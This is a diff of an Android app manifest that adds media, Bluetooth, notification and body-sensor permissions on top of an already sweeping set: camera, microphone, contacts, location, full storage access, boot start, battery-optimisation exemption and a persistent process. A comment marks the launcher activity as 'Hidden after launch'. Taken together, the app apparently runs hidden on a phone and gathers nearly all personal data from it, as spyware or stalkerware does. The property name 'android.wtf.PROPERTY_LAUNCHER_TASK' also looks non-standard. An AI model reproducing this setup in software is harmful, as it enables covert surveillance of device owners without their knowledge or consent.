@@ -12,7 +12,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" /> <!-- ✅ ADDED HERE -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
     
     <!-- 🌐 NETWORK & WIFI PERMISSIONS -->
@@ -24,6 +24,8 @@
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-feature android:name="android.hardware.camera" android:required="true" />
     <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    
     <!-- 🎤 MICROPHONE PERMISSIONS -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
@@ -47,7 +49,20 @@
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
     
-    <!-- 💾 STORAGE PERMISSIONS -->
+    <!-- ANDROID 13+ (API 33+) SPECIFIC PERMISSIONS -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- BLUETOOTH PERMISSIONS FOR ANDROID 12+ -->
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    
+    <!-- LEGACY STORAGE PERMISSIONS (for Android 12 and below) -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
@@ -60,10 +75,6 @@
     <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND" />
     
     <!-- 📱 ADDITIONAL DEVICE INFO PERMISSIONS -->
-    <uses-permission android:name="android.permission.BLUETOOTH" />
-    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
-    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
     <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
     <uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
@@ -104,6 +115,9 @@
     <uses-permission android:name="android.permission.HIGH_SAMPLING_RATE_SENSORS" />
     <uses-permission android:name="android.permission.DEVICE_IDLE_WHITELIST" />
     
+    <!-- BODY SENSORS (for Android 13+) -->
+    <uses-permission android:name="android.permission.BODY_SENSORS" />
+    
     <application
         android:name=".AppController"
         android:allowBackup="true"
@@ -117,15 +131,12 @@
         android:usesCleartextTraffic="true"
         android:persistent="true"
         android:requestLegacyExternalStorage="true"
-        android:networkSecurityConfig="@xml/network_security_config">  <!-- ADD THIS LINE -->
+        android:networkSecurityConfig="@xml/network_security_config">
         
-        
-        <!-- ✅ ANDROID 12+ FOREGROUND SERVICE BEHAVIOR - ADDED HERE -->
+        <!-- ✅ ANDROID 12+ FOREGROUND SERVICE BEHAVIOR -->
         <property
             android:name="android.wtf.PROPERTY_LAUNCHER_TASK"
             android:value="true" />
-        
-      
         
         <!-- Main Activity (Launcher) - Hidden after launch -->
         <activity
